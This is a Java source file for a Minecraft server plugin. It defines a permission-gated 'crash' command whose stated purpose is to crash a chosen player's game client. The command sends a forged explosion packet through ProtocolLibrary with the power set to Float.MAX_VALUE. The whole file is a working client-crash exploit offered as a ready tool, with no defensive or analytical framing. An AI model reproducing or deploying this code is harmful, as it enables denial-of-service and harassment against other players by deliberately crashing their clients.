package dev.craftefix.craftUtils.commands;

import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.ProtocolManager;
import com.comphenix.protocol.events.PacketContainer;
import org.bukkit.entity.Player;
import org.bukkit.util.Vector;
import revxrsal.commands.annotation.Command;
import revxrsal.commands.annotation.Description;
import revxrsal.commands.annotation.Optional;
import revxrsal.commands.bukkit.annotation.CommandPermission;

import java.util.ArrayList;

public class CrashCommand {

    @Command({"cu crash", "crash"})
    @Description("Crash a player's client")
    @CommandPermission("craftutils.crashClient")
    public void crashPlayer(Player sender, Player target, @Optional Float power) {
        ProtocolManager protocolManager = ProtocolLibrary.getProtocolManager();

        PacketContainer fakeExplosion = new PacketContainer(PacketType.Play.Server.EXPLOSION);
        fakeExplosion.getDoubles()
                .write(0, target.getLocation().getX())
                .write(1, target.getLocation().getY())
                .write(2, target.getLocation().getZ());
        fakeExplosion.getFloat().write(0, power != null ? power : Float.MAX_VALUE);
        fakeExplosion.getBlockPositionCollectionModifier().write(0, new ArrayList<>());
        fakeExplosion.getVectors().write(0, target.getVelocity().add(new Vector(1, 1, 1)));

        sender.sendMessage("§cYou have sent a fake explosion to " + target.getName() + "!");
        protocolManager.sendServerPacket(target, fakeExplosion);
    }
}
